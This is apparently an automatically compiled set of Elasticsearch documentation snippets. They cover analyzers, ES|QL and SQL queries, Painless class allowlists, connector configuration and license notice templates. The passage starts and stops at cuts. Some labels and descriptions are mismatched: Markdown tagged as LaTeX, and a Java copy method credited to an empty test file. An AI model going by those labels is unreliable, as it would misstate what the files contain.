text\nCODE:\n```\ns(100000002,1,'come',v,1,0).\ns(100000002,2,'advance',v,1,0).\ns(100000002,3,'approach',v,1,0).\n```\n\n----------------------------------------\n\nTITLE: Filtering with Terms Aggregation in Elasticsearch\nDESCRIPTION: Shows how to combine filtering with terms aggregation to get popular models of red Gucci shirts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /shirts/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        { \"term\": { \"color\": \"red\"   }},\n        { \"term\": { \"brand\": \"gucci\" }}\n      ]\n    }\n  },\n  \"aggs\": {\n    \"models\": {\n      \"terms\": { \"field\": \"model\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the JSON Processor without Target Field\nDESCRIPTION: Example configuration of a JSON processor without specifying a target field. This will cause the processor to replace the source field with the parsed JSON object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"json\" : {\n    \"field\" : \"source_and_target\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: A sample copyright disclaimer for employers or schools to sign, disclaiming copyright interest in a program written by an employee or student.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-pdf-module-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice Template\nDESCRIPTION: Template for the short license notice that should be displayed when an interactive program starts, including copyright notice and basic warranty disclaimer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n    Gnomovision version 69, Copyright (C) year name of author\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n    `show w'. This is free software, and you are welcome to redistribute\n    it under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Adding and Subtracting Date Periods from DateTime Values in ESQL\nDESCRIPTION: This snippet demonstrates how to add and subtract date periods from datetime values using ESQL. It creates a row with a datetime value, then adds a literal date period of '3 DAYS' and subtracts a date period created using the TO_DATEPERIOD function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_dateperiod.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = \"2024-01-01\"::datetime\n| EVAL y = x + \"3 DAYS\"::date_period, z = x - TO_DATEPERIOD(\"3 days\");\n```\n\n----------------------------------------\n\nTITLE: Creating a custom analyzer with dictionary decompounder filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to create a custom analyzer using a customized dictionary_decompounder filter in an index creation API request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-dict-decomp-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT dictionary_decompound_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_dictionary_decompound\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"22_char_dictionary_decompound\" ]\n        }\n      },\n      \"filter\": {\n        \"22_char_dictionary_decompound\": {\n          \"type\": \"dictionary_decompounder\",\n          \"word_list_path\": \"analysis/example_word_list.txt\",\n          \"max_subword_size\": 22\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Response showing document with preserved binary data\nDESCRIPTION: Response showing both the original binary data and the extracted attachment properties when remove_binary is set to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 22,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"data\": \"e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0=\",\n    \"attachment\": {\n      \"content_type\": \"application/rtf\",\n      \"language\": \"ro\",\n      \"content\": \"Lorem ipsum dolor sit amet\",\n      \"content_length\": 28\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Static import for emit function in Elasticsearch Painless\nDESCRIPTION: Defines a static import for the `emit` function, which is used to collect values for the field. It binds the `emit` callback to `org.elasticsearch.script.LongFieldScript$Emit` and provides access to a long value. The `bound_to` keyword specifies the target of the static import.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.long_field.txt#2025-04-21_snippet_2\n\nLANGUAGE: Painless\nCODE:\n```\nstatic_import {\n    # The `emit` callback to collect values for the field\n    void emit(org.elasticsearch.script.LongFieldScript, long) bound_to org.elasticsearch.script.LongFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Polish Stop Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure an index with a custom analyzer using the polish_stop token filter. It sets up an analyzer that applies lowercase and polish_stop filters to the input text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-polish-stop.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /polish_stop_example\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"analyzer_with_stop\": {\n            \"tokenizer\": \"standard\",\n            \"filter\": [\n              \"lowercase\",\n              \"polish_stop\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"polish_stop\": {\n            \"type\": \"polish_stop\",\n            \"stopwords\": [\n              \"_polish_\",\n              \"jeść\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HashSet Implementation in Java\nDESCRIPTION: This snippet defines the HashSet class, which implements the Set interface. It provides methods for managing a collection of unique elements based on hash table principles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_19\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.HashSet {\n  ()\n  (Collection)\n  def clone()\n}\n```\n\n----------------------------------------\n\nTITLE: MPL Source Code License Notice Template\nDESCRIPTION: Standard license notice text to be included in source code files distributed under the Mozilla Public License v2.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-url/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is subject to the terms of the Mozilla Public\\nLicense, v. 2.0. If a copy of the MPL was not distributed with this\\nfile, You can obtain one at http://mozilla.org/MPL/2.0/.\n```\n\n----------------------------------------\n\nTITLE: LaTeX Documentation Structure for TO_VERSION Function\nDESCRIPTION: LaTeX markup defining the structure of the documentation for the TO_VERSION function in ESQL, including sections for syntax, parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_version.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TO_VERSION` [esql-to_version]\n\n**Syntax**\n\n:::{image} ../../../images/functions/to_version.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/to_version.md\n:::\n\n:::{include} ../description/to_version.md\n:::\n\n:::{include} ../types/to_version.md\n:::\n\n:::{include} ../examples/to_version.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests for Box Connector\nDESCRIPTION: Shell commands to run functional tests for the Box connector. It includes options for full testing and a faster small data size test.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-box.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\n$ make ftest NAME=box\n```\n\nLANGUAGE: sh\nCODE:\n```\nmake ftest NAME=box DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Basic ENRICH Policy Example\nDESCRIPTION: Example showing basic usage of the ENRICH command with languages_policy, automatically matching on the language_code field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/enrich.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM languages.csv | ENRICH languages_policy\n```\n\n----------------------------------------\n\nTITLE: Splitting a String in ESQL\nDESCRIPTION: This snippet demonstrates the use of the SPLIT function in ESQL to divide a single-valued string into multiple components based on a delimiter. The variable 'words' holds a semicolon-separated list, and the SPLIT function generates an array of individual words as output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/split.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW words=\"foo;bar;baz;qux;quux;corge\"\n| EVAL word = SPLIT(words, \";\")\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Delimited Payload\nDESCRIPTION: Creates an index with a custom analyzer that uses the delimited_payload filter with default settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT delimited_payload\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_delimited_payload\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"delimited_payload\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cross-Field Query with Multiple Analyzer Groups\nDESCRIPTION: Example showing a cross_fields query that searches across fields with different analyzers. The fields are automatically grouped by analyzer, with each group treated separately and the best score used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"Jon\",\n      \"type\":       \"cross_fields\",\n      \"fields\":     [\n        \"first\", \"first.edge\",\n        \"last\",  \"last.edge\"\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LIMIT with GROUP BY and ORDER BY\nDESCRIPTION: Example showing the recommended approach of using LIMIT when sorting by aggregation functions to avoid performance issues with large result sets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test GROUP BY age ORDER BY COUNT(*) LIMIT 100;\n```\n\n----------------------------------------\n\nTITLE: Negated Character Class Examples\nDESCRIPTION: Examples showing how to use the caret symbol to negate character classes, matching anything except the specified characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_12\n\nLANGUAGE: text\nCODE:\n```\n[^abc]      # matches any character except 'a', 'b', or 'c'\n[^a-c]      # matches any character except 'a', 'b', or 'c'\n[^-abc]     # matches any character except '-', 'a', 'b', or 'c'\n[^abc\\-]    # matches any character except 'a', 'b', 'c', or '-'\n```\n\n----------------------------------------\n\nTITLE: SharePoint Server Connector Configuration in YAML\nDESCRIPTION: Example YAML configuration for the SharePoint Server connector when deploying as a self-managed connector using Docker. This snippet shows the structure and required fields for the config.yml file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint.md#2025-04-22_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: sharepoint_server\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source for Stored Text Fields\nDESCRIPTION: Example demonstrating how to set up an index with synthetic _source enabled and a text field with the 'store' parameter set to true, which preserves order and duplicates in the field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": { \"type\": \"text\", \"store\": true }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"text\": [\n    \"the quick brown fox\",\n    \"the quick brown fox\",\n    \"jumped over the lazy dog\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: SVG Image Include\nDESCRIPTION: Markdown syntax for including the TO_INTEGER function syntax diagram as an SVG image.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_integer.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/to_integer.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Write Timeout in Elasticsearch YAML\nDESCRIPTION: Configures the socket write timeout for SMTP. Defaults to two minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.write_timeout\n```\n\n----------------------------------------\n\nTITLE: Extracting Day of Week with Painless Runtime Keyword Field Context\nDESCRIPTION: This script uses the keyword_field context to extract the day of the week from a timestamp. It returns the full day name in English using Java's date handling capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      emit(doc['@timestamp'].value.dayOfWeekEnum.getDisplayName(TextStyle.FULL, Locale.ENGLISH));\n    \"\"\"\n  },\n  \"context\": \"keyword_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"@timestamp\": \"2020-04-30T14:31:43-05:00\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Common Grams Filter in Elasticsearch\nDESCRIPTION: This example demonstrates using the analyze API with a common_grams filter to create bigrams for the common words 'is' and 'the' in the text 'the quick fox is brown'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-common-grams-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"whitespace\",\n  \"filter\" : [\n    {\n      \"type\": \"common_grams\",\n      \"common_words\": [\"is\", \"the\"]\n    }\n  ],\n  \"text\" : \"the quick fox is brown\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Inference Bucket Aggregation Syntax in Elasticsearch\nDESCRIPTION: Demonstrates the basic structure of an inference bucket aggregation with model ID, inference configuration for regression, and buckets path mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-inference-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"inference\": {\n    \"model_id\": \"a_model_for_inference\",\n    \"inference_config\": {\n      \"regression_config\": {\n        \"num_top_feature_importance_values\": 2\n      }\n    },\n    \"buckets_path\": {\n      \"avg_cost\": \"avg_agg\",\n      \"max_cost\": \"max_agg\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Equality Equals with Reference Types in Painless\nDESCRIPTION: Shows how the equality equals operator works with reference types (Lists) in Painless. It creates two List objects, adds an element to one, compares them, adds an element to the other, and then compares them again, demonstrating comparison of List references.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_13\n\nLANGUAGE: painless\nCODE:\n```\n\"List a = new ArrayList(); <1>\nList b = new ArrayList(); <2>\na.add(1);                 <3>\nboolean c = a == b;       <4>\nb.add(1);                 <5>\nc = a == b;               <6>\"\n```\n\n----------------------------------------\n\nTITLE: Basic Max Bucket Aggregation Syntax in Elasticsearch\nDESCRIPTION: Shows the basic syntax structure for a max_bucket aggregation that finds maximum values in specified bucket paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-max-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"max_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Head Pipe Syntax in EQL\nDESCRIPTION: Defines the syntax for the 'head' pipe in EQL. The <max> parameter specifies the maximum number of matching events or sequences to return.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-pipe-ref.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\nhead <max>\n```\n\n----------------------------------------\n\nTITLE: Painless Script Variables and Return Types for Metric Aggregation Reduce Context\nDESCRIPTION: Defines the available variables and return types for Painless scripts in metric aggregation reduce context. Scripts have access to read-only params Map for user parameters and states Map for values from prior combine/map scripts. Scripts can return List, Map, String or primitive values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-metric-agg-reduce-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\n// Available variables:\nparams: Map  // read-only user parameters\nstates: Map  // values from prior combine/map script\n\n// Valid return types:\n// - List\n// - Map\n// - String\n// - primitive\n```\n\n----------------------------------------\n\nTITLE: Configuring Jira Notification Settings in elasticsearch.yml\nDESCRIPTION: YAML configuration for Jira notifications in Elasticsearch. Includes settings for default account, server URL, authentication credentials, and issue default values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_35\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.jira.default_account: \"my_account\" # Default Jira account to use\nxpack.notification.jira.account:\n  allow_http: false # If false, rejects HTTP protocol URLs (defaults to false)\n  secure_url: # URL of the Jira Software server (must be added to keystore)\n  secure_user: # Username for Jira authentication (must be added to keystore)\n  secure_password: # Password for Jira authentication (must be added to keystore)\n  issue_defaults: # Default field values for created Jira issues\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT MultiPoint in Elasticsearch\nDESCRIPTION: Example of indexing a Well-Known Text (WKT) MultiPoint geometry in Elasticsearch. This represents the same geometry as the GeoJSON example but using WKT syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTIPOINT (102.0 2.0, 103.0 2.0)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Nested Fields Schema Example\nDESCRIPTION: Example schema showing multi-level nested fields structure in Elasticsearch, which cannot be queried simultaneously in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\n       column         |     type      |    mapping\n----------------------+---------------+-------------\nnested_A              |STRUCT         |NESTED\nnested_A.nested_X     |STRUCT         |NESTED\nnested_A.nested_X.text|VARCHAR        |KEYWORD\nnested_A.text         |VARCHAR        |KEYWORD\nnested_B              |STRUCT         |NESTED\nnested_B.text         |VARCHAR        |KEYWORD\n```\n\n----------------------------------------\n\nTITLE: Customizing Common Grams Filter with Advanced Options in Elasticsearch\nDESCRIPTION: This example demonstrates creating a custom common_grams filter with ignore_case and query_mode set to true, which changes how common words are processed in the token stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-common-grams-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /common_grams_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"index_grams\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"common_grams_query\" ]\n        }\n      },\n      \"filter\": {\n        \"common_grams_query\": {\n          \"type\": \"common_grams\",\n          \"common_words\": [ \"a\", \"is\", \"the\" ],\n          \"ignore_case\": true,\n          \"query_mode\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Interval to DateTime in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to add a time interval to a date value using the + operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST('1969-05-13T12:34:56' AS DATETIME) + INTERVAL 49 YEARS AS result;\n\n       result\n--------------------\n2018-05-13T12:34:56Z\n```\n\n----------------------------------------\n\nTITLE: Complete Token Filter Chain with Duplicate Removal\nDESCRIPTION: Shows a complete analysis chain using keyword_repeat, stemmer, and remove_duplicates filters to generate both stemmed and unstemmed tokens while removing duplicates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-repeat-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    \"keyword_repeat\",\n    \"stemmer\",\n    \"remove_duplicates\"\n  ],\n  \"text\": \"fox running and jumping\",\n  \"explain\": true,\n  \"attributes\": \"keyword\"\n}\n```\n\n----------------------------------------\n\nTITLE: DISSECT Named Skip Key\nDESCRIPTION: Shows how to use named skip keys to ignore certain fields in the output\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_8\n\nLANGUAGE: esql\nCODE:\n```\nROW message=\"1.2.3.4 - - 30/Apr/1998:22:00:52 +0000\"\n| DISSECT message \"\"\"%{clientip} %{?ident} %{?auth} %{@timestamp}\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Combining STD_DEV with Inline Functions in ESQL\nDESCRIPTION: Advanced example showing how to combine STD_DEV with MV_MAX to calculate the standard deviation of maximum salary changes. First applies MV_MAX to each row's salary_change values, then calculates the standard deviation of those maximums.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/std_dev.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS stddev_salary_change = STD_DEV(MV_MAX(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Simple ABS Function with Negative Number\nDESCRIPTION: Demonstrates using the ABS function to get the absolute value of a negative number using a ROW constructor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/abs.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW number = -1.0\n| EVAL abs_number = ABS(number)\n```\n\n----------------------------------------\n\nTITLE: Configuring Load Balancing Type in Elasticsearch YAML\nDESCRIPTION: Sets the load balancing type for Elasticsearch. Options include failover, dns_failover, round_robin, and dns_round_robin. Each type determines how connections are distributed across multiple servers or IP addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nload_balance.type: failover\n```\n\n----------------------------------------\n\nTITLE: Negating Time Intervals in Elasticsearch SQL\nDESCRIPTION: Example showing how to negate a year-to-month interval using the unary minus operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT - INTERVAL '49-1' YEAR TO MONTH result;\n\n    result\n---------------\n-49-1\n```\n\n----------------------------------------\n\nTITLE: Launching Multiple Elasticsearch Nodes on Azure (Shell)\nDESCRIPTION: This script creates multiple Elasticsearch nodes on Azure using a previously created VM image. It demonstrates how to scale out the cluster by launching multiple instances in a loop.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-scale.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nfor x in $(seq  2 10)\n\tdo\n\t\techo \"Launching azure instance #$x...\"\n\t\tazure vm create azure-elasticsearch-cluster \\\n\t\t                esnode-image \\\n\t\t                --vm-name myesnode$x \\\n\t\t                --vm-size extrasmall \\\n\t\t                --ssh $((21 + $x)) \\\n\t\t                --ssh-cert /tmp/azure-certificate.pem \\\n\t\t                --connect \\\n\t\t                elasticsearch password1234\\!\\!\n\tdone\n```\n\n----------------------------------------\n\nTITLE: Implementing Armenian Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Armenian analyzer, showing the configuration of Armenian-specific stopwords, keyword marking for stem exclusion, and stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /armenian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"armenian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_armenian_\" \n        },\n        \"armenian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"օրինակ\"] \n        },\n        \"armenian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"armenian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_armenian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"armenian_stop\",\n            \"armenian_keywords\",\n            \"armenian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Copying map objects in DotExpandingXContentParser\nDESCRIPTION: This method creates a deep copy of map objects during parsing when the deepCopyMapAndListValues option is enabled. It recursively processes each entry to ensure all nested objects are properly copied.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\n@SuppressWarnings(\"unchecked\")\nprivate Object copy(Object value) {\n    if (value instanceof Map) {\n        Map<String, Object> copy = new HashMap<>();\n        for (Map.Entry<String, Object> entry : ((Map<String, Object>) value).entrySet()) {\n            copy.put(entry.getKey(), copy(entry.getValue()));\n        }\n        return copy;\n    } else if (value instanceof List) {\n        List<Object> copy = new ArrayList<>();\n        for (Object v : (List<Object>) value) {\n            copy.add(copy(v));\n        }\n        return copy;\n    } else {\n        return value;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median of Maximum Salary Change Using Inline Functions in ESQL\nDESCRIPTION: This example shows how to combine the MEDIAN function with the MV_MAX function to calculate the median of the maximum values in a multi-valued column. It uses MV_MAX to get the maximum salary change per row, then applies MEDIAN to these maximum values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/median.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS median_max_salary_change = MEDIAN(MV_MAX(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Defining Java StringBuilder Class Methods\nDESCRIPTION: This snippet defines the methods available from the java.lang.StringBuilder class in Painless scripting.  Similar to StringBuffer, it provides mutable string operations including appending, deleting, inserting, replacing, and reversing characters. The main difference from StringBuffer is StringBuilder is not synchronized and intended for single-thread operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_22\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.StringBuilder {\\n  ()\\n  (CharSequence)\\n  StringBuilder append(def)\\n  StringBuilder append(CharSequence,int,int)\\n  StringBuilder appendCodePoint(int)\\n  int capacity()\\n  int codePointAt(int)\\n  int codePointBefore(int)\\n  int codePointCount(int,int)\\n  StringBuilder delete(int,int)\\n  StringBuilder deleteCharAt(int)\\n  void getChars(int,int,char[],int)\\n  int indexOf(String)\\n  int indexOf(String,int)\\n  StringBuilder insert(int,def)\\n  int lastIndexOf(String)\\n  int lastIndexOf(String,int)\\n  int offsetByCodePoints(int,int)\\n  StringBuilder replace(int,int,String)\\n  StringBuilder reverse()\\n  void setCharAt(int,char)\\n  void setLength(int)\\n  String substring(int)\\n  String substring(int,int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: New Instance Operator in Painless\nDESCRIPTION: Illustrates the allocation of new instances using the 'new' operator in Painless. Discusses overloaded constructors and error handling when instances are allocated with mismatched argument types or incorrect arity. It covers implicit casting of allocated instances.\nSOURCE: 